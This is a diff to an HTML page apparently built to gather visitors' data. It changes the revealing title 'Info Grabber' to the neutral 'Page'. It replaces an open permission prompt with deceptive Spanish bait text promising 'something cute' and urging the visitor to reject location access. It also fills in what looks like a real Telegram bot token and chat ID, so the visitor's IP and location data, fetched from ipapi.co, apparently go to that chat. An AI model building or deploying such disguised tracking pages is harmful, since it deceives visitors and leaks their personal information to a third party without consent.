@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Info Grabber</title>
+  <title>Page</title>
   <style>
     body { font-family: Arial; padding: 20px; background: #f0f0f0; }
     .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -10,14 +10,14 @@
 </head>
 <body>
   <div class="box">
-    <h2>Show Us Your Info</h2>
-    <button onclick="collectAndSend()">Give Permission</button>
-    <pre id="result">Waiting for permission...</pre>
+    <h2>Haz click en el boton y rechaza la ubicacion</h2>
+    <button onclick="collectAndSend()">ver algo lindo</button>
+    <pre id="result">..</pre>
   </div>
 
   <script>
-    const BOT_TOKEN = "YOUR_BOT_TOKEN";
-    const CHAT_ID = "YOUR_CHAT_ID";
+    const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
+    const CHAT_ID = "6065284869";
 
     async function getIPInfo() {
       const res = await fetch("https://ipapi.co/json/");
